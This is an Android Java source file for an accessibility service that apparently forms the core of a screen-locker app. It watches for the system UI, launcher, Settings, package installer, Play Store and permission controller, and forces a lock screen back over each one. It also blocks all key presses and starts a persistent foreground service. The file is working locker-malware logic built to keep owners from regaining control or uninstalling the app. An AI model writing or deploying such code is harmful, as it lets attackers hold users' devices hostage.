package com.lockscreen;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

public class AdminAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String className = event.getClassName() != null ? event.getClassName().toString() : "";

            // Block system UI, launcher, settings, installer
            if (className.contains("com.android.systemui") ||
                className.contains("launcher") ||
                className.contains("com.android.settings") ||
                className.contains("com.android.packageinstaller") ||
                className.contains("com.android.vending") ||
                className.contains("com.android.permissioncontroller")) {

                // Re-open lock screen
                new Handler().postDelayed(() -> {
                    Intent i = new Intent(this, LockScreenActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(i);
                }, 100);
            }
        }
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        // Block all keys
        return true;
    }

    @Override
    public void onInterrupt() {
        // Service interrupted - try to restart
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        startForegroundService(new Intent(this, LockScreenService.class));
    }
  }
